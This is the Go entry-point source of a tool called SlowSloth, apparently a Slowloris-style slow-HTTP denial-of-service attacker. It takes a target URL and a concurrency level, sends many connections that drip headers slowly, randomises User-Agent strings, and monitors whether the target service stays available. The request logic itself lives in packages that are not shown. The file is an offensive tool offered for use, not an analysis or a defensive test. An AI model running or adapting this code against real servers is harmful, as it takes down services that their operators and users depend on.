package main

import (
	"SlowSloth/common"
	"SlowSloth/pkg/servicechecker"
	slowrequest "SlowSloth/pkg/slowrequester"
	"SlowSloth/pkg/statusprinter"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

func main() {

	const (
		Reset = "\033[0m"
	)

	urlString := flag.String("u", "", "Target URL")
	method := flag.String("m", "GET", "HTTP Method: GET or POST")
	data := flag.String("d", "", "Data for POST request")
	concurrency := flag.Int("c", 1, "Number of concurrent requests")
	delay := flag.Int("delay", 10, "Delay in seconds between header sends")
	flag.Parse()

	if err := common.ValidateInput(urlString, method, data); err != nil {
		fmt.Println("Error:", err)
		flag.Usage()
		return
	}

	urlObj, err := url.Parse(*urlString)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		return
	}

	if !isServiceAvailable(*urlString) {
		fmt.Println("Error: Service is not available at startup.")
		os.Exit(1) // Exit the program if the service is not available
	}

	var strategy slowrequest.RequestStrategy
	switch *method {
	case "GET":
		strategy = &slowrequest.GetRequestStrategy{}
	case "POST":
		strategy = &slowrequest.PostRequestStrategy{Body: *data}
	default:
		fmt.Println("Invalid method:", *method)
		return
	}

	statusManager := statusprinter.NewStatusManager()
	requestManager := slowrequest.NewRequestManager(strategy, statusManager)

	var wg sync.WaitGroup
	wg.Add(*concurrency)

	for i := 0; i < *concurrency; i++ {
		go requestManager.SendSlowRequest(&wg, urlObj, time.Duration(*delay)*time.Second)
	}

	// Initialize and start the service checker
	serviceChecker := servicechecker.NewServiceChecker(*urlString, statusManager, 10*time.Second)
	go serviceChecker.CheckServiceAvailability()

	done := make(chan bool)
	var printWg sync.WaitGroup

	printWg.Add(1)

	go func() {
		defer printWg.Done()
		for i := 0; ; i++ {
			select {
			case <-done:
				return
			default:
				if i > 0 {

					fmt.Printf("\033[3A\033[K\033[K\033[K")
				}

				fmt.Printf("Total active connections: %d\n", statusManager.ActiveConnections())

				fmt.Printf("Service availability: %s%t\n", statusManager.SetServiceColor(statusManager.IsServiceAvailable()), statusManager.IsServiceAvailable())
				fmt.Printf(Reset)
				fmt.Printf("Total RAM usage: %d MB\n", statusManager.TotalRAMUsage())
				time.Sleep(1 * time.Second)
			}
		}
	}()

	wg.Wait() // Wait for the main workload to complete

	// Signal the printing goroutine to stop and wait for it to finish
	done <- true
	printWg.Wait()

	// Clear the line before printing the final status
	fmt.Printf("\r%s\r", strings.Repeat(" ", 50))

	// Now print the final status on a new line
	fmt.Printf("Final Status - Total active connections: %d, Service availability: %t, Total RAM usage %d MB\n",
		statusManager.ActiveConnections(),
		statusManager.IsServiceAvailable(),
		statusManager.TotalRAMUsage())

	fmt.Println("All requests completed.")

}

func isServiceAvailable(url string) bool {
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", common.GetRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == http.StatusOK
}
